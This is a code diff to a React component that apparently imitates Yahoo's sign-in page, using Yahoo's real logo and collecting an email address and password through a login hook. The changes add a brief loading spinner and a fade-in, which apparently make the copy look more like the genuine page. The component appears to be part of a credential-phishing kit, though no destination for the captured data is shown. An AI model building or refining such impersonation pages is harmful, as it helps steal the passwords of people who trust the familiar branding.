@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 import { Mail } from 'lucide-react';
@@ -43,8 +43,14 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [pageReady, setPageReady] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
+
+  useEffect(() => {
+    const timer = setTimeout(() => setPageReady(true), 100);
+    return () => clearTimeout(timer);
+  }, []);
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
@@ -60,8 +66,16 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
     <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className={`select-none ${className}`} />
   );
 
+  if (!pageReady) {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <Spinner size="lg" color="border-purple-600" />
+      </div>
+    );
+  }
+
   return (
-    <div className="min-h-screen bg-white font-sans flex flex-col">
+    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       {/* Changed py-4 to py-6 to move header down, and h-14 to h-11 to reduce logo size */}
       <header className="flex-shrink-0 flex justify-between items-center py-6 px-10">
         <YahooLogo className="h-11" />
